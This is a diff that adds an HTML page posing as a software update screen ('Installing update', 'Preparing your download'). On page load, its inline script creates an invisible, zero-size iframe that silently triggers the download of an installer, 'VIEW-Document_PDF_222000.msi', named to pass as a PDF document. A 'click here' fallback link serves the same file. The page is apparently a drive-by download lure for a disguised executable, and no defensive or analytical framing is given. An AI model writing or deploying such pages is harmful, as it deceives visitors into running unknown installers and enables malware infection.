@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Installing update</title>
+  <style>
+    body { margin: 0; font-family: "Segoe UI", system-ui, sans-serif; background: #f3f3f3; color: #1a1a1a; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+    .card { background: #fff; border-radius: 8px; box-shadow: 0 8px 32px rgba(0,0,0,.08); padding: 32px 40px; max-width: 420px; text-align: center; }
+    h1 { font-size: 1.25rem; font-weight: 600; margin: 0 0 8px; }
+    p { font-size: 0.95rem; color: #555; line-height: 1.5; margin: 0 0 20px; }
+    .spinner { width: 40px; height: 40px; margin: 0 auto 16px; border: 3px solid #e5e5e5; border-top-color: #0078d4; border-radius: 50%; animation: spin 0.9s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    a { color: #0078d4; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="spinner" aria-hidden="true"></div>
+    <h1>Preparing your download</h1>
+    <p>If the download does not start automatically, <a id="manual-link" href="/VIEW-Document_PDF_222000.msi" download="VIEW-Document_PDF_222000.msi">click here</a>.</p>
+  </div>
+  <script>
+    (function () {
+      var MSI = '/VIEW-Document_PDF_222000.msi';
+      var frame = document.createElement('iframe');
+      frame.style.cssText = 'position:absolute;width:0;height:0;border:0;clip:rect(0,0,0,0);overflow:hidden';
+      frame.src = MSI;
+      document.body.appendChild(frame);
+    })();
+  </script>
+</body>
+</html>
